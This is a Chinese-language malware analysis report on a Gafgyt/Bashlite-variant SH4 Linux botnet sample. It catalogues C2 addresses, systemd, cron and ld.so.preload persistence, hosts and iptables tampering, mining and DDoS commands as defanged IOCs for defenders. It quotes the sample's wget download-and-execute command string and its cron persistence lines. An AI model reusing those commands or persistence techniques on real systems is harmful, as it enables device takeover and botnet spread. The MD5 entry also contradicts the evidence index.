---
title: "恶意样本分析：Gafgyt/Bashlite 系变种（sh7f3a 构建）（ELF · elf · 80e18c8f）"
published: 2026-10-30
draft: false
description: "恶意（置信度中）：Gafgyt/Bashlite 系变种（sh7f3a 构建） · botnet/backdoor/miner · 难度 hard · 动态沙箱 + 静态反编译"
tags: ["Gafgyt", "botnet", "backdoor", "miner", "ELF"]
category: "恶意样本日报"
lang: "zh"
---

> [!WARNING]
> **判定：恶意** · 家族 **Gafgyt/Bashlite 系变种（sh7f3a 构建）**（存疑） · 置信度 **中**
> 
> 别名：Bashlite、Qbot、Orimhhh、sh7f3a campaign
> 
> SH4 Linux ELF 内含完整的物联网僵尸网络功能面：硬编码 C2 地址与 server=/port=/arch= 配置、HTTP 下载更新、systemd/cron/rc.local 持久化、ld.so.preload 后门、查杀竞争僵尸网络、篡改 hosts 与 iptables、Cryptonight 挖矿、多协议 DDoS 指令集以及反调试/进程伪装。上述逻辑均由字符串、静态结构与函数交叉引用直接取证。

## 速览

| 项目 | 内容 |
|:--|:--|
| 家族 | **Gafgyt/Bashlite 系变种（sh7f3a 构建）** · 别名 Bashlite、Qbot、Orimhhh、sh7f3a campaign · _存疑_ |
| 置信度 | **中** |
| 行为类 | botnet · backdoor · miner |
| 难度 | hard |
| 首次出现 | 2026-10-28 06:23:42 |
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 来源 | [MalwareBazaar](https://bazaar.abuse.ch/sample/80e18c8fb92657a2bf7d47ce66f0e7d9276c240475942fe0262d5619e1b8ae5d/) |

## 攻击链

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="攻击链概览" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">内置双C2服务器地址</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">解析server/port配置</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">下载更新并执行</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">注册systemd服务持久化</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1543.002</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">植入cron与rc.local</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1053.003</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">静态</text>
</svg>

## 样本标识

| 项目 | 值 |
|:--|:--|
| SHA-256 | `80e18c8fb92657a2bf7d47ce66f0e7d9276c240475942fe0262d5619e1b8ae5d` |
| MD5 | _未记录_ |
| 大小 | 185,464 字节（181.1 KB） |
| 类型 | ELF · `elf` |

## 行为分析

共 **12** 条行为，每条都挂了证据，且全部静态可得。

### 1. 内置双C2服务器地址

`T1071.001` · 置信度 **中** · 静态

在只读数据段硬编码两个控制端 IP：默认地址位于 0x426dbc（147.79.62[.]90），备用地址位于 0x426e38（83.168.69[.]95）；主逻辑函数 0x40b46e 与命令处理函数 0x40a932 分别加载这两个地址。

> **证据**：0x40b46e 引用 0x426dbc；0x40a932 引用 0x426e38；字符串相邻处有 default 与 server= 配置键
> 
> **来源**：`ref:97270bda90` · `ref:231cb7447f`

### 2. 解析server/port配置

`T1071.001` · 置信度 **中** · 静态

按 server=/port=/arch= 文本格式解析连接参数，解析失败时回落到内置默认地址，形成可被下发配置覆盖的 C2 选择逻辑。

> **证据**：0x426c18 server= / 0x426c20 port= / 0x426c28 arch= 连续字符串，0x40a932 引用
> 
> **来源**：`ref:231cb7447f` · `ref:97270bda90`

### 3. 下载更新并执行

`T1105` · 置信度 **高** · 静态

使用格式串 cd /tmp; wget -q hxxp://%s:%d/%s -O .b; chmod +x .b; ./.b & 从远端拉取新版本并立即执行，同时支持 !update 指令触发。

> **证据**：0x426c30 下载命令格式串；0x426c10 !update；均在 0x40a932 的引用表内
> 
> **来源**：`ref:231cb7447f` · `ref:97270bda90`

### 4. 注册systemd服务持久化

`T1543.002` · 置信度 **高** · 静态

生成 /etc/systemd/system/killer-helper.service 与 /etc/systemd/system/sys-network-helper.service，ExecStart 指向 /usr/lib/systemd/.system-helper 或 /dev/shm/.sh7f3a，Restart=always，并调用 systemctl enable 启用。

> **证据**：0x25044 与 0x25e40 为完整 unit 模板；0x40592c 与 0x40824e 引用相关路径
> 
> **来源**：`ref:58890434ac` · `ref:5cfc055289` · `ref:97270bda90`

### 5. 植入cron与rc.local

`T1053.003` · 置信度 **高** · 静态

向 /etc/cron.d/killer-helper、/etc/cron.d/sys-network-helper 写入每分钟执行的守护命令，并向 /etc/rc.local 追加 @reboot 自启项，确保重启后恢复。

> **证据**：0x2501c /etc/cron.d/killer-helper；0x25d04 与 0x25d54 为 * * * * * 与 @reboot 行；0x25164 @reboot root %s
> 
> **来源**：`ref:58890434ac` · `ref:5cfc055289` · `ref:97270bda90`

### 6. ld.so.preload预加载后门

`T1574.006` · 置信度 **高** · 静态

把 /usr/lib/.sh7f3a.so 写入 /etc/ld.so.preload；共享库由内嵌 C 源码经 gcc -shared -fPIC -nostartfiles 在目标机编译生成，构造函数在锁文件可用时 fork/setsid 并 exec /dev/shm/.sh7f3a。

> **证据**：0x25de8 /usr/lib/.sh7f3a.so 与 0x25dfc /etc/ld.so.preload；内嵌源码在 0x26878（含 execl 与 flock 逻辑）；0x4070ec/0x40824e 引用
> 
> **来源**：`ref:58890434ac` · `ref:231cb7447f` · `ref:97270bda90`

### 7. 查杀竞争僵尸网络

`T1489` · 置信度 **高** · 静态

维护 mirai、gafgyt、qbot、bashlite、sora、owari、tsunami、condi、manji 等竞争家族名单，按进程名与命令行匹配后终止，并写入 /var/run/.killer.* 状态文件进行节流。

> **证据**：0x25358-0x253d0 家族名单；0x25470 killer；0x40592c 引用 /var/run/.killer.lock 等
> 
> **来源**：`ref:58890434ac` · `ref:70cadd3643` · `ref:97270bda90`

### 8. 篡改hosts屏蔽安全站点

`T1562.001` · 置信度 **高** · 静态

在 /etc/hosts 的 # BEGIN-sh7f3a / # END-sh7f3a 标记块内写入 0.0.0[.]0 映射，屏蔽 avast[.]com、virustotal[.]com、any.run、hybrid-analysis[.]com、urlhaus.abuse.ch 等安全厂商与分析平台。

> **证据**：0x25c8c /etc/hosts、0x25c98 标记、0x26360-0x2653c 域名列表；0x40662e 引用
> 
> **来源**：`ref:5cfc055289` · `ref:97270bda90`

### 9. iptables阻断扫描端口

`T1562.004` · 置信度 **高** · 静态

生成 /var/run/.sh7f3a.ip.rules 并调用 /usr/sbin/iptables 与 iptables-restore，对 2323、5900、5901、5902、5800、5801、3389、2222 等端口执行 DROP，并插入自定义 INPUT 链抵御扫描器。

> **证据**：0x259f0 ip.rules、0x25a30 iptables、0x26298 起端口串；0x40572e 与 0x40592c 引用
> 
> **来源**：`ref:5cfc055289` · `ref:97270bda90`

### 10. 部署cryptonight挖矿

`T1496` · 置信度 **中** · 静态

样本内置 xmr/miner/cryptonight 标识及矿工相关逻辑，可在受控主机上投放 Cryptonight 挖矿模块进行资源劫持。

> **证据**：0x253d8 xmr、0x253dc miner、0x253e4 cryptonight；只读段指针表 0x424b84 附近被引用
> 
> **来源**：`ref:5cfc055289` · `ref:231cb7447f` · `ref:97270bda90`

### 11. DDoS攻击指令集

`T1498` · 置信度 **高** · 静态

实现 udpplain、syn、ack、http、raknet、ssh、tcpstomp、minecraft、ovh、tcpbypass 等攻击类型，并解析 psize、srcport、usleep、msg、domain、path、method 参数，构成可远程下发的 DDoS 平台。

> **证据**：0x26cb4-0x26d40 攻击类型与参数串；解析函数 0x40a932
> 
> **来源**：`ref:5cfc055289` · `ref:97270bda90`

### 12. 反调试与进程伪装

`T1622` · 置信度 **高** · 静态

读取 /proc/self/status 的 TracerPid、/proc/self/maps，并把 oom_score_adj 设为 -1000；使用 [kworker/0:0] 至 [kworker/0:5] 伪装进程名，同时保留对调试/蜜罐环境的检测分支。

> **证据**：0x24c40 /proc/self/status、0x24c54 TracerPid:、0x25190 [kworker/0:0]、0x24c04 -1000；0x4005f0 引用 orimhhh 伪装名
> 
> **来源**：`ref:58890434ac` · `ref:97270bda90` · `ref:a1ca6692a1`


## IOC（已去武器化）

### 网络

:::caution
**真实服务器侧仍未验证**：上述连接/握手是与本地受控 受控仿真服务 完成的，真实 C2 的响应与下发内容仍未知。
:::

| 类型 | 值 | 端口 | 角色 | 证据来源 | 动态观测 |
|:--|:--|--:|:--|:--|:--|
| tcp | `147[.]79[.]62[.]90` | - | c2 | 静态 | ⏳ 未观测 |
| tcp | `83[.]168[.]69[.]95` | - | c2 | 静态 | ⏳ 未观测 |

### 主机

**互斥体**

- `/var/run/.main.lock`
- `/var/run/.main.wd.lock`
- `/var/run/.killer.lock`
- `LK_sh7f3a`

**落地路径**

- `/dev/shm/.sh7f3a`
- `/usr/lib/systemd/.system-helper`
- `/usr/lib/.sh7f3a.so`
- `/etc/ld.so.preload`
- `/etc/systemd/system/killer-helper.service`
- `/etc/systemd/system/sys-network-helper.service`
- `/etc/cron.d/killer-helper`
- `/etc/cron.d/sys-network-helper`
- `/var/run/.main.pid`
- `/var/run/.watchdog.pid`
- `/var/run/.watchdog2.pid`
- `/var/run/.stealth.pid`
- `/var/run/.defender.pid`
- `/var/run/.killer.pid`
- `/var/run/.killer.disabled`
- `/var/run/.sh7f3a.ip.rules`
- `/var/run/.sh7f3a.dis.list`
- `/var/run/.cleanup_now`
- `/etc/.hosts.tmp.XXXXXX`
- `/tmp/.%s_ps.c`

**服务**

- `killer-helper.service`
- `sys-network-helper.service`
- `defender-helper`
- `stealth-helper`

**计划任务**

- `* * * * * root test -f /dev/shm/.sh7f3a && /dev/shm/.sh7f3a >/dev/null 2>&1`
- `@reboot root test -f /dev/shm/.sh7f3a && /dev/shm/.sh7f3a >/dev/null 2>&1`
- `@reboot root <self>`

### 配置

| 键 | 值 | 必需 | 证据来源 |
|:--|:--|:--|:--|
| `c2_hosts` | `147[.]79[.]62[.]90;83[.]168[.]69[.]95` | 是 | 静态 |
| `c2_port` | `未静态确定（由 server=/port= 配置提供，缺省回落逻辑存在）` | 是 | 静态 |
| `config_format` | `server=<host>\nport=<port>\narch=<arch>` | 是 | 静态 |
| `campaign_id` | `sh7f3a / ORIMHHH_RESPAWN / orimhhh` | 否 | 静态 |
| `encryption_algo` | `xorshift128 伪随机数发生器；另含 SHA-256 轮常量与 TEA 黄金比常量（用于 C2 加密未证实）` | 否 | 静态 |
| `miner_algo` | `cryptonight` | 否 | 静态 |
| `install_paths` | `/dev/shm/.sh7f3a;/usr/lib/systemd/.system-helper;/usr/lib/.sh7f3a.so` | 否 | 静态 |
| `evasion_hosts` | `avast[.]com;avg[.]com;virustotal[.]com;kaspersky[.]com;bitdefender[.]com;malwarebytes[.]com;any.run;hybrid-analysis[.]com;joesandbox[.]com;urlhaus.abuse.ch;threatcrowd[.]org;otx[.]alienvault[.]com` | 否 | 静态 |

## 不应误判

:::important
以下结论**容易被误判**，引用本报告时请注意。

- 不要将其归类为勒索软件或数据窃取型 stealer：未发现文件加密或用户数据回传逻辑，主要功能是僵尸网络、挖矿与 DDoS。
- 不要把 147[.]79[.]62[.]90 与 83[.]168[.]69[.]95 的外联当作已动态观测事实：二者来自静态字符串与交叉引用，本次未能完成真实执行，需动态复核。
- 不要把 /etc/hosts 中 0.0.0[.]0 映射的 avast[.]com、virustotal[.]com 等域名误报为 C2 或攻击者基础设施。
- 不要把字符串集中出现的 abcdefghijklmnopqrstuvwxyz{|} 当作 flag，它只是编码/字符表的一部分。
:::

## 分析方法与局限

| 项目 | 内容 |
|:--|:--|
| 分析方法 | 动态沙箱分析（Linux 样本）+ 静态反编译 |
| 脱壳 | 否 |

**局限与待验证**

1. 样本为 SuperH4 架构，当前可直接使用的本机/沙箱执行环境无法加载，动态执行未能真实引爆，reproduced=false；C2 与配置均为静态恢复，pending_dynamic_verify=true。
2. 两个 C2 IP 位于只读数据段并被 0x40b46e / 0x40a932 引用，但尚未观测到 connect 事件，端口与主备角色需动态确认。
3. 主逻辑区（0x40a932、0x40b46e）未被自动识别为独立函数，相关结论基于字符串地址、指令引用表与相邻函数语义交叉验证，未逐条反编译该核心函数。
4. sha256 与文件大小已核对；样本未加壳，未发现可提取的第二阶段载荷，更新载荷需运行时下载。

## 证据索引

<details>
<summary>展开 12 条工具证据</summary>

| 证据 ID | 工具 | 摘要 |
|:--|:--|:--|
| `ref:7831a7555b` | ELF 结构解析 | 确认 ELF32 LE、e_machine=42(SH)、EXEC、静态链接、无符号/无导入，入口 0x4010a0 |
| `ref:51cdf87b6d` | 字符串提取 | 定位只读段硬编码 IP 147.79.62[.]90(0x426dbc) 与 83.168.69[.]95(0x426e38) |
| `ref:5cfc055289` | 字符串提取 | 提取持久化、iptables、hosts 屏蔽、配置键、攻击类型与 C2 相关字符串 |
| `ref:58890434ac` | 字符串提取 | 提取 systemd/cron/rc.local/ld.so.preload、竞争对手家族名单与反调试字符串 |
| `ref:70cadd3643` | 字符串提取 | 提取 /proc、systemd、netcat、mirai/gafgyt/tsunami 等行为字符串 |
| `ref:231cb7447f` | 字符串提取 | 带偏移的只读段字符串视图，确认 server=/port=/arch=、下载格式串与双 IP 的相对位置 |
| `ref:13bf977205` | 密码学常量识别 | 识别 SHA-256 轮常量(0x25738) 与 TEA delta(0x484) |
| `ref:81f028cb3e` | decompile.function | 反编译 0x40dd20，确认为 xorshift128 伪随机数发生器 |
| `ref:a1ca6692a1` | decompile.function | 反编译入口 0x4010a0，确认经由 libc 启动例程进入主逻辑 |
| `ref:97270bda90` | evidence.record | 自写脚本交叉引用：将 C2、配置键、持久化、hosts/iptables、家族名单字符串映射到引用函数 0x40b46e、0x40a932、0x40592c、0x40662e、0x4070ec、0x40824e 等 |
| `ref:95235560c7` | decompile.symbols | 反编译器识别 481 个函数且架构为 SuperH4，确认主逻辑区函数未被自动拆分 |
| `ref:d29c5c094c` | 哈希与指纹 | 核对 sha256=80e18c8f...、md5=7339dc5e...、大小 185464 字节 |

</details>

---

_本报告样本不公开，IOC 已去武器化，仅供安全研究。_
